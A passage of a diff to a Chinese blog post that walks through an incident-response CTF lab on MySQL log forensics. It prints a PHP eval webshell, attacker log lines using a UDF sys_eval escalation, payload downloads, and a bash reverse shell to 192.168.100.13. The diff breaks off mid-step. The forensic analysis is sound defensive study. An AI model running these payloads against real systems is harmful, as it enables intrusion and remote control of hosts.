@@ -303,6 +303,14 @@
         <li><a href="#通过本地-pc-ssh到服务器并且分析黑客篡改的命令将黑客篡改的命令里面的关键字符串作为-flag-提交">通过本地 PC SSH到服务器并且分析黑客篡改的命令,将黑客篡改的命令里面的关键字符串作为 FLAG 提交;</a></li>
       </ol>
     </li>
+    <li><a href="#第二章日志分析-mysql应急响应">第二章日志分析-mysql应急响应</a>
+      <ol>
+        <li><a href="#1黑客第一次写入的shell-flag关键字符串">1.黑客第一次写入的shell flag{关键字符串}</a></li>
+        <li><a href="#2黑客反弹shell的ip-flagip">2.黑客反弹shell的ip flag{ip}</a></li>
+        <li><a href="#3黑客提权文件的完整路径-md5-flagmd5-注-xxxxxxxxxxxxxxxxx">3.黑客提权文件的完整路径 md5 flag{md5} 注 /xxx/xxx/xxx/xxx/xxx.xx</a></li>
+        <li><a href="#4黑客获取的权限-flagwhoami后的值">4.黑客获取的权限 flag{whoami后的值}</a></li>
+      </ol>
+    </li>
   </ol>
 </nav>
         </div>
@@ -379,7 +387,7 @@
 
 
                 <time class="article-time--reading">
-                    阅读时长: 11 分钟
+                    阅读时长: 14 分钟
                 </time>
             </div>
         
@@ -1608,6 +1616,354 @@
 </span></code></pre></td>
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">flag{c195i2923381905517d818e313792d196}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="第二章日志分析-mysql应急响应">第二章日志分析-mysql应急响应
+</h2><h3 id="1黑客第一次写入的shell-flag关键字符串">1.黑客第一次写入的shell flag{关键字符串}
+</h3><p>进入web目录，</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cat *.php
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>找到</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="mi">1</span>	<span class="mi">2</span>	<span class="o">&lt;?</span><span class="nx">php</span> <span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">]);</span><span class="cp">?&gt;</span><span class="err">	4
+</span></span></span><span class="line"><span class="cl"><span class="err">//ccfda79e-7aa1-4275-bc26-a6189eb9a20b
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>所以flag</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">flag{ccfda79e-7aa1-4275-bc26-a6189eb9a20b}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="2黑客反弹shell的ip-flagip">2.黑客反弹shell的ip flag{ip}
+</h3><p>既然开启了web服务，我们查看一下web日志</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">cat</span> <span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="nb">log</span><span class="o">/</span><span class="n">apache2</span><span class="o">/</span><span class="n">access</span><span class="o">.</span><span class="n">log</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>仔细查看，主要是对admin.php进行sql注入的操作</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">192.168.200.2 - - <span class="o">[</span>01/Aug/2023:02:07:50 +0000<span class="o">]</span> <span class="s2">&#34;GET /adminer.php?username=root HTTP/1.1&#34;</span> <span class="m">200</span> <span class="m">3529</span> <span class="s2">&#34;http://192.168.200.31:8005/adminer.php&#34;</span> <span class="s2">&#34;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0&#34;</span>
+</span></span><span class="line"><span class="cl">192.168.200.2 - - <span class="o">[</span>01/Aug/2023:02:07:52 +0000<span class="o">]</span> <span class="s2">&#34;GET /adminer.php?username=root&amp;db=mysql HTTP/1.1&#34;</span> <span class="m">200</span> <span class="m">6607</span> <span class="s2">&#34;http://192.168.200.31:8005/adminer.php?username=root&#34;</span> <span class="s2">&#34;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0&#34;</span>
+</span></span><span class="line"><span class="cl">192.168.200.2 - - <span class="o">[</span>01/Aug/2023:02:07:52 +0000<span class="o">]</span> <span class="s2">&#34;GET /adminer.php?username=root&amp;db=mysql&amp;script=db HTTP/1.1&#34;</span> <span class="m">200</span> <span class="m">7170</span> <span class="s2">&#34;http://192.168.200.31:8005/adminer.php?username=root&amp;db=mysql&#34;</span> <span class="s2">&#34;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0&#34;</span>
+</span></span><span class="line"><span class="cl">192.168.200.2 - - <span class="o">[</span>01/Aug/2023:02:07:54 +0000<span class="o">]</span> <span class="s2">&#34;GET /adminer.php?username=root&amp;db=mysql&amp;sql= HTTP/1.1&#34;</span> <span class="m">200</span> <span class="m">3570</span> <span class="s2">&#34;http://192.168.200.31:8005/adminer.php?username=root&amp;db=mysql&#34;</span> <span class="s2">&#34;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0&#34;</span>
+</span></span><span class="line"><span class="cl">192.168.200.2 - - <span class="o">[</span>01/Aug/2023:02:08:05 +0000<span class="o">]</span> <span class="s2">&#34;GET /adminer.php?username=root&amp;db=cms&amp;sql= HTTP/1.1&#34;</span> <span class="m">200</span> <span class="m">3082</span> <span class="s2">&#34;http://192.168.200.31:8005/adminer.php?username=root&amp;db=mysql&amp;sql=&#34;</span> <span class="s2">&#34;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0&#34;</span>
+</span></span><span class="line"><span class="cl">192.168.200.2 - - <span class="o">[</span>01/Aug/2023:02:08:17 +0000<span class="o">]</span> <span class="s2">&#34;POST /sh.php HTTP/1.1&#34;</span> <span class="m">200</span> <span class="m">332</span> <span class="s2">&#34;-&#34;</span> <span class="s2">&#34;Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_7; ja-jp) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27&#34;</span>
+</span></span><span class="line"><span class="cl">192.168.200.2 - - <span class="o">[</span>01/Aug/2023:02:08:20 +0000<span class="o">]</span> <span class="s2">&#34;POST /sh.php HTTP/1.1&#34;</span> <span class="m">200</span> <span class="m">245</span> <span class="s2">&#34;-&#34;</span> <span class="s2">&#34;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1623.0 Safari/537.36&#34;</span>
+</span></span><span class="line"><span class="cl">192.168.200.2 - - <span class="o">[</span>01/Aug/2023:02:09:04 +0000<span class="o">]</span> <span class="s2">&#34;POST /adminer.php?username=root&amp;db=cms&amp;sql=select%20version()%3B%0A HTTP/1.1&#34;</span> <span class="m">200</span> <span class="m">3835</span> <span class="s2">&#34;http://192.168.200.31:8005/adminer.php?username=root&amp;db=cms&amp;sql=&#34;</span> <span class="s2">&#34;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0&#34;</span>
+</span></span><span class="line"><span class="cl">192.168.200.2 - - <span class="o">[</span>01/Aug/2023:02:09:47 +0000<span class="o">]</span> <span class="s2">&#34;POST /adminer.php?username=root&amp;db=cms&amp;sql=select%20load_file(%22%2Fetc%2Fpasswd%22)%3B HTTP/1.1&#34;</span> <span class="m">200</span> <span class="m">4287</span> <span class="s2">&#34;http://192.168.200.31:8005/adminer.php?username=root&amp;db=cms&amp;sql=select%20version()%3B%0A&#34;</span> <span class="s2">&#34;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0&#34;</span>
+</span></span><span class="line"><span class="cl">192.168.200.2 - - <span class="o">[</span>01/Aug/2023:02:11:07 +0000<span class="o">]</span> <span class="s2">&#34;POST /adminer.php?username=root&amp;db=cms&amp;sql=show%20variables%20like%20%27%25plugin%25%27%3B HTTP/1.1&#34;</span> <span class="m">200</span> <span class="m">3746</span> <span class="s2">&#34;http://192.168.200.31:8005/adminer.php?username=root&amp;db=cms&amp;sql=select%20load_file(%22%2Fetc%2Fpasswd%22)%3B&#34;</span> <span class="s2">&#34;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0&#34;</span>
+</span></span><span class="line"><span class="cl">192.168.200.2 - - <span class="o">[</span>01/Aug/2023:02:11:20 +0000<span class="o">]</span> <span class="s2">&#34;POST /adminer.php?username=root&amp;db=cms&amp;sql=select%20*%20from%20func%3B HTTP/1.1&#34;</span> <span class="m">200</span> <span class="m">3478</span> <span class="s2">&#34;http://192.168.200.31:8005/adminer.php?username=root&amp;db=cms&amp;sql=show%20variables%20like%20%27%25plugin%25%27%3B&#34;</span> <span class="s2">&#34;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0&#34;</span>
+</span></span><span class="line"><span class="cl">192.168.200.2 - - <span class="o">[</span>01/Aug/2023:02:11:28 +0000<span class="o">]</span> <span class="s2">&#34;GET /adminer.php?username=root&amp;db=cms&amp;sql= HTTP/1.1&#34;</span> <span class="m">200</span> <span class="m">3363</span> <span class="s2">&#34;http://192.168.200.31:8005/adminer.php?username=root&amp;db=cms&amp;sql=select%20*%20from%20func%3B&#34;</span> <span class="s2">&#34;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0&#34;</span>
+</span></span><span class="line"><span class="cl">192.168.200.2 - - <span class="o">[</span>01/Aug/2023:02:11:30 +0000<span class="o">]</span> <span class="s2">&#34;GET /adminer.php?username=root HTTP/1.1&#34;</span> <span class="m">200</span> <span class="m">3377</span> <span class="s2">&#34;http://192.168.200.31:8005/adminer.php?username=root&amp;db=cms&amp;sql=&#34;</span> <span class="s2">&#34;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0&#34;</span>
+</span></span><span class="line"><span class="cl">192.168.200.2 - - <span class="o">[</span>01/Aug/2023:02:11:31 +0000<span class="o">]</span> <span class="s2">&#34;GET /adminer.php?username=root&amp;sql= HTTP/1.1&#34;</span> <span class="m">200</span> <span class="m">2866</span> <span class="s2">&#34;http://192.168.200.31:8005/adminer.php?username=root&#34;</span> <span class="s2">&#34;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0&#34;</span>
+</span></span><span class="line"><span class="cl">192.168.200.2 - - <span class="o">[</span>01/Aug/2023:02:11:33 +0000<span class="o">]</span> <span class="s2">&#34;POST /adminer.php?username=root&amp;sql=select%20*%20from%20func%3B HTTP/1.1&#34;</span> <span class="m">200</span> <span class="m">3147</span> <span class="s2">&#34;http://192.168.200.31:8005/adminer.php?username=root&amp;sql=&#34;</span> <span class="s2">&#34;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0&#34;</span>
+</span></span><span class="line"><span class="cl">192.168.200.2 - - <span class="o">[</span>01/Aug/2023:02:12:00 +0000<span class="o">]</span> <span class="s2">&#34;POST /adminer.php?username=root&amp;sql=select%20*%20from%20func%3B HTTP/1.1&#34;</span> <span class="m">200</span> <span class="m">7687</span> <span class="s2">&#34;http://192.168.200.31:8005/adminer.php?username=root&amp;sql=select%20*%20from%20func%3B&#34;</span> <span class="s2">&#34;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0&#34;</span>
+</span></span><span class="line"><span class="cl">192.168.200.2 - - <span class="o">[</span>01/Aug/2023:02:12:34 +0000<span class="o">]</span> <span class="s2">&#34;POST /adminer.php?username=root&amp;sql=select%20*%20from%20func%3B HTTP/1.1&#34;</span> <span class="m">200</span> <span class="m">7666</span> <span class="s2">&#34;http://192.168.200.31:8005/adminer.php?username=root&amp;sql=select%20*%20from%20func%3B&#34;</span> <span class="s2">&#34;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0&#34;</span>
+</span></span><span class="line"><span class="cl">192.168.200.2 - - <span class="o">[</span>01/Aug/2023:02:12:54 +0000<span class="o">]</span> <span class="s2">&#34;POST /adminer.php?username=root&amp;sql=create%20function%20sys_eval%20returns%20string%20soname%20%27mysqludf.so%27%3B HTTP/1.1&#34;</span> <span class="m">200</span> <span class="m">3324</span> <span class="s2">&#34;http://192.168.200.31:8005/adminer.php?username=root&amp;sql=select%20*%20from%20func%3B&#34;</span> <span class="s2">&#34;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0&#34;</span>
+</span></span><span class="line"><span class="cl">192.168.200.2 - - <span class="o">[</span>01/Aug/2023:02:13:00 +0000<span class="o">]</span> <span class="s2">&#34;POST /adminer.php?username=root&amp;sql=select%20sys_eval(%27whoami%27)%3B HTTP/1.1&#34;</span> <span class="m">200</span> <span class="m">3740</span> <span class="s2">&#34;http://192.168.200.31:8005/adminer.php?username=root&amp;sql=create%20function%20sys_eval%20returns%20string%20soname%20%27mysqludf.so%27%3B&#34;</span> <span class="s2">&#34;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0&#34;</span>
+</span></span><span class="line"><span class="cl">192.168.200.2 - - <span class="o">[</span>01/Aug/2023:02:13:08 +0000<span class="o">]</span> <span class="s2">&#34;POST /adminer.php?username=root&amp;sql=select%20*%20from%20func%3B HTTP/1.1&#34;</span> <span class="m">200</span> <span class="m">3298</span> <span class="s2">&#34;http://192.168.200.31:8005/adminer.php?username=root&amp;sql=select%20sys_eval(%27whoami%27)%3B&#34;</span> <span class="s2">&#34;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0&#34;</span>
+</span></span><span class="line"><span class="cl">192.168.200.2 - - <span class="o">[</span>01/Aug/2023:02:13:18 +0000<span class="o">]</span> <span class="s2">&#34;POST /adminer.php?username=root&amp;sql=select%20sys_eval(%27whoami%27)%3B HTTP/1.1&#34;</span> <span class="m">200</span> <span class="m">3761</span> <span class="s2">&#34;http://192.168.200.31:8005/adminer.php?username=root&amp;sql=select%20*%20from%20func%3B&#34;</span> <span class="s2">&#34;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0&#34;</span>
+</span></span><span class="line"><span class="cl">192.168.200.2 - - <span class="o">[</span>01/Aug/2023:02:13:53 +0000<span class="o">]</span> <span class="s2">&#34;POST /adminer.php?username=root&amp;sql=select%20sys_eval(%27curl%20192.168.100.13%3A771%27)%3B HTTP/1.1&#34;</span> <span class="m">200</span> <span class="m">3800</span> <span class="s2">&#34;http://192.168.200.31:8005/adminer.php?username=root&amp;sql=select%20sys_eval(%27whoami%27)%3B&#34;</span> <span class="s2">&#34;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0&#34;</span>
+</span></span><span class="line"><span class="cl">192.168.200.2 - - <span class="o">[</span>01/Aug/2023:02:14:11 +0000<span class="o">]</span> <span class="s2">&#34;POST /adminer.php?username=root&amp;sql=select%20sys_eval(%27wget%20192.168.100.13%3A771%27)%3B HTTP/1.1&#34;</span> <span class="m">200</span> <span class="m">3822</span> <span class="s2">&#34;http://192.168.200.31:8005/adminer.php?username=root&amp;sql=select%20sys_eval(%27curl%20192.168.100.13%3A771%27)%3B&#34;</span> <span class="s2">&#34;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0&#34;</span>
+</span></span><span class="line"><span class="cl">192.168.200.2 - - <span class="o">[</span>01/Aug/2023:02:16:31 +0000<span class="o">]</span> <span class="s2">&#34;POST /adminer.php?username=root&amp;sql=select%20sys_eval(%27wget%20-o%20%2Ftmp%2F1.sh%20192.168.100.13%3A771%2F1.sh%27)%3B HTTP/1.1&#34;</span> <span class="m">200</span> <span class="m">3862</span> <span class="s2">&#34;http://192.168.200.31:8005/adminer.php?username=root&amp;sql=select%20sys_eval(%27wget%20192.168.100.13%3A771%27)%3B&#34;</span> <span class="s2">&#34;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0&#34;</span>
+</span></span><span class="line"><span class="cl">192.168.200.2 - - <span class="o">[</span>01/Aug/2023:02:16:35 +0000<span class="o">]</span> <span class="s2">&#34;POST /adminer.php?username=root&amp;sql=select%20sys_eval(%27wget%20-o%20%2Ftmp%2F1.sh%20192.168.100.13%3A777%2F1.sh%27)%3B HTTP/1.1&#34;</span> <span class="m">200</span> <span class="m">3875</span> <span class="s2">&#34;http://192.168.200.31:8005/adminer.php?username=root&amp;sql=select%20sys_eval(%27wget%20-o%20%2Ftmp%2F1.sh%20192.168.100.13%3A771%2F1.sh%27)%3B&#34;</span> <span class="s2">&#34;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0&#34;</span>
+</span></span><span class="line"><span class="cl">192.168.200.2 - - <span class="o">[</span>01/Aug/2023:02:16:43 +0000<span class="o">]</span> <span class="s2">&#34;POST /adminer.php?username=root&amp;sql=select%20sys_eval(%27ls%20%2Ftmp%2F%27)%3B HTTP/1.1&#34;</span> <span class="m">200</span> <span class="m">3975</span> <span class="s2">&#34;http://192.168.200.31:8005/adminer.php?username=root&amp;sql=select%20sys_eval(%27wget%20-o%20%2Ftmp%2F1.sh%20192.168.100.13%3A777%2F1.sh%27)%3B&#34;</span> <span class="s2">&#34;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0&#34;</span>
+</span></span><span class="line"><span class="cl">192.168.200.2 - - <span class="o">[</span>01/Aug/2023:02:16:57 +0000<span class="o">]</span> <span class="s2">&#34;POST /adminer.php?username=root&amp;sql=select%20sys_eval(%27bash%20%2Ftmp%2F1.sh%27)%3B HTTP/1.1&#34;</span> <span class="m">200</span> <span class="m">3889</span> <span class="s2">&#34;http://192.168.200.31:8005/adminer.php?username=root&amp;sql=select%20sys_eval(%27ls%20%2Ftmp%2F%27)%3B&#34;</span> <span class="s2">&#34;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0&#34;</span>
+</span></span><span class="line"><span class="cl">192.168.200.2 - - <span class="o">[</span>01/Aug/2023:02:17:05 +0000<span class="o">]</span> <span class="s2">&#34;POST /sh.php HTTP/1.1&#34;</span> <span class="m">200</span> <span class="m">416</span> <span class="s2">&#34;-&#34;</span> <span class="s2">&#34;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36&#34;</span>
+</span></span><span class="line"><span class="cl">192.168.200.2 - - <span class="o">[</span>01/Aug/2023:02:17:09 +0000<span class="o">]</span> <span class="s2">&#34;POST /sh.php HTTP/1.1&#34;</span> <span class="m">200</span> <span class="m">470</span> <span class="s2">&#34;-&#34;</span> <span class="s2">&#34;Opera/9.80 (X11; Linux i686; U; fr) Presto/2.7.62 Version/11.01&#34;</span>
+</span></span><span class="line"><span class="cl">192.168.200.2 - - <span class="o">[</span>01/Aug/2023:02:17:10 +0000<span class="o">]</span> <span class="s2">&#34;POST /sh.php HTTP/1.1&#34;</span> <span class="m">200</span> <span class="m">209</span> <span class="s2">&#34;-&#34;</span> <span class="s2">&#34;Mozilla/5.0 (Windows NT 6.0; WOW64; rv:24.0) Gecko/20100101 Firefox/24.0&#34;</span>
+</span></span><span class="line"><span class="cl">192.168.200.2 - - <span class="o">[</span>01/Aug/2023:02:17:37 +0000<span class="o">]</span> <span class="s2">&#34;POST /adminer.php?username=root&amp;sql=select%20sys_eval(%27ls%20-la%20%2Ftmp%2F%27)%3B HTTP/1.1&#34;</span> <span class="m">200</span> <span class="m">4116</span> <span class="s2">&#34;http://192.168.200.31:8005/adminer.php?username=root&amp;sql=select%20sys_eval(%27bash%20%2Ftmp%2F1.sh%27)%3B&#34;</span> <span class="s2">&#34;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0&#34;</span>
+</span></span><span class="line"><span class="cl">192.168.200.2 - - <span class="o">[</span>01/Aug/2023:02:18:18 +0000<span class="o">]</span> <span class="s2">&#34;POST /adminer.php?username=root&amp;sql=select%20sys_eval(%27echo%20YmFzaCAtaSA%2BJi9kZXYvdGNwLzE5Mi4xNjguMTAwLjEzLzc3NyAwPiYx%7Cbase64%20-d%27)%3B HTTP/1.1&#34;</span> <span class="m">200</span> <span class="m">4025</span> <span class="s2">&#34;http://192.168.200.31:8005/adminer.php?username=root&amp;sql=select%20sys_eval(%27ls%20-la%20%2Ftmp%2F%27)%3B&#34;</span> <span class="s2">&#34;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0&#34;</span>
+</span></span><span class="line"><span class="cl">192.168.200.2 - - <span class="o">[</span>01/Aug/2023:02:18:27 +0000<span class="o">]</span> <span class="s2">&#34;POST /adminer.php?username=root&amp;sql=select%20sys_eval(%27echo%20YmFzaCAtaSA%2BJi9kZXYvdGNwLzE5Mi4xNjguMTAwLjEzLzc3NyAwPiYx%7Cbase64%20-d%3E%2Ftmp%2F1.sh%27)%3B HTTP/1.1&#34;</span> <span class="m">200</span> <span class="m">4023</span> <span class="s2">&#34;http://192.168.200.31:8005/adminer.php?username=root&amp;sql=select%20sys_eval(%27echo%20YmFzaCAtaSA%2BJi9kZXYvdGNwLzE5Mi4xNjguMTAwLjEzLzc3NyAwPiYx%7Cbase64%20-d%27)%3B&#34;</span> <span class="s2">&#34;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0&#34;</span>
+</span></span><span class="line"><span class="cl">192.168.200.2 - - <span class="o">[</span>01/Aug/2023:02:18:37 +0000<span class="o">]</span> <span class="s2">&#34;POST /adminer.php?username=root&amp;sql=select%20sys_eval(%27ls%20-la%20%2Ftmp%2F1.sh%27)%3B HTTP/1.1&#34;</span> <span class="m">200</span> <span class="m">4029</span> <span class="s2">&#34;http://192.168.200.31:8005/adminer.php?username=root&amp;sql=select%20sys_eval(%27echo%20YmFzaCAtaSA%2BJi9kZXYvdGNwLzE5Mi4xNjguMTAwLjEzLzc3NyAwPiYx%7Cbase64%20-d%3E%2Ftmp%2F1.sh%27)%3B&#34;</span> <span class="s2">&#34;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0&#34;</span>
+</span></span><span class="line"><span class="cl">192.168.200.2 - - <span class="o">[</span>01/Aug/2023:02:19:07 +0000<span class="o">]</span> <span class="s2">&#34;POST /adminer.php?username=root&amp;sql=select%20sys_eval(%27bash%20%2Ftmp%2F1.sh%27)%3B HTTP/1.1&#34;</span> <span class="m">200</span> <span class="m">4014</span> <span class="s2">&#34;http://192.168.200.31:8005/adminer.php?username=root&amp;sql=select%20sys_eval(%27ls%20-la%20%2Ftmp%2F1.sh%27)%3B&#34;</span> <span class="s2">&#34;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>发现主要是对<code>/tmp/1.sh</code>进行执行，我们直接查看，对上面那个base64解码也行</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">root</span><span class="err">@</span><span class="n">xuanji</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="nb">log</span><span class="o">/</span><span class="n">apache2</span><span class="c1"># cat /tmp/1.sh</span>
+</span></span><span class="line"><span class="cl"><span class="n">bash</span> <span class="o">-</span><span class="n">i</span> <span class="o">&gt;&amp;/</span><span class="n">dev</span><span class="o">/</span><span class="n">tcp</span><span class="o">/</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">100.13</span><span class="o">/</span><span class="mi">777</span> <span class="mi">0</span><span class="o">&gt;&amp;</span><span class="mi">1</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>所以flag</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">flag{192.168.100.13}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="3黑客提权文件的完整路径-md5-flagmd5-注-xxxxxxxxxxxxxxxxx">3.黑客提权文件的完整路径 md5 flag{md5} 注 /xxx/xxx/xxx/xxx/xxx.xx
+</h3><p>前下看log目录下面还有mysql目录</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">cat</span> <span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="nb">log</span><span class="o">/</span><span class="n">mysql</span><span class="o">/</span><span class="n">error</span><span class="o">.</span><span class="n">log</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>发现其实对系统执行命令了，而且看到前面用sys_eval来执行可以想到是mysql的udf提权</p>
+<p>我们回到web目录查看mysql有关文件</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">root</span><span class="o">@</span><span class="nx">xuanji</span><span class="o">:/</span><span class="k">var</span><span class="o">/</span><span class="nx">www</span><span class="o">/</span><span class="nx">html</span><span class="c1"># cat common.php
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$conn</span><span class="o">=</span><span class="nx">mysqli_connect</span><span class="p">(</span><span class="s2">&#34;localhost&#34;</span><span class="p">,</span><span class="s2">&#34;root&#34;</span><span class="p">,</span><span class="s2">&#34;334cc35b3c704593&#34;</span><span class="p">,</span><span class="s2">&#34;cms&#34;</span><span class="p">,</span><span class="s2">&#34;3306&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$conn</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s2">&#34;数据库连接失败&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>找到账密，连上数据库</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
